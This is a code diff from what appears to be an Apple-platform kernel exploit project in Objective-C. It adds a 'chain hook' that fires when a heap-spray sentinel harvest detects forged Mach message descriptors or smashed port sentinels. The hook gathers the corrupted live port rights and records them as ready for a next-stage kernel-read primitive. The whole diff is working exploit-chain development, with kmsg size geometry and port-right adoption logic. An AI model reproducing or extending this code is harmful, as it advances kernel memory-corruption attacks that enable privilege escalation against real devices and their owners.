@@ -48,7 +48,7 @@
 #import <sys/socket.h>
 #import <netinet/in.h>
 
-#define P073_BUILD @"p073-second-table-v7j-prefill2"
+#define P073_BUILD @"p073-second-table-v7j1-chain-hook"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -933,6 +933,26 @@ static NSURL *p073_model_url(NSString *name) {
     }
     p073_log(@"[D2] sentinel harvest: mutated=%u clean=%u descForged=%u", mut, clean, descForged);
 
+        /* v7j1 CHAIN HOOK: when the harvest proves a forged descriptor or any
+           smashed port-kind sentinel, the smashed port RIGHT is adoptable
+           directly (recv already holds it). Record the ready-state on the
+           board so the socket-adopt/kread provider build consumes it. */
+        if (mut > 0 || descForged > 0) {
+            NSMutableArray *rights = [NSMutableArray array];
+            for (uint32_t i = 0; i < nPre; i++)
+                if (sentPre[i].alive && sentPre[i].port != MACH_PORT_NULL)
+                    [rights addObject:@(sentPre[i].port)];
+            id bd = [[NSClassFromString(@"P007Board") alloc] init];
+            NSString *det = [NSString stringWithFormat:
+                @"mutated=%u descForged=%u livePortRights=%lu (next: OOL-forged kread door v9)",
+                mut, descForged, (unsigned long)rights.count];
+            if (bd && [bd respondsToSelector:@selector(recordEvent:kind:detail:source:)]) {
+                ((void (*)(id, SEL, id, id, id, id))objc_msgSend)(
+                    bd, @selector(recordEvent:kind:detail:source:),
+                    @"p073_chain_ready", @"adopt", det, @"p073");
+                p073_log(@"[CHAIN] p073_chain_ready board event — %@", det);
+            }
+        }
     /* ---- verdict ---- */
     p073_log(@"=== VERDICT ===");
     if (touched > 0) {
